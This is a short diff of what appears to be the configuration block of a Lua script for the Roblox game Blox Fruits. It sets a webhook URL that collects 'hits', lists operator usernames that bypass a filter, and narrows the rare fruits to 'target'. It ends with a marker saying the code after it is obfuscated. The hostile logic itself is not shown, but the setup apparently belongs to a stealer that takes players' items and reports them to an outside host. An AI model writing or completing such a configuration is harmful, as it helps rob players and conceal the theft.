@@ -1,6 +1,6 @@
 Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/d3690bb6-d5ac-4891-b7cc-8f55263cfadb" -- << Protected URL for main user hits (url1)
 Usernames = {"user1", "user2", "user3", "user4", "user5"} -- << Your primary usernames (can use commands, bypass filter)
-FruitsToHit = {"Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon (West)-Dragon (West)"} -- << Fruits you want to target (others can be added below)
+FruitsToHit = {"Dragon (West)-Dragon (West)"} -- << Fruits you want to target (others can be added below)
 
 
 --OBFUSCATE AFTER THIS
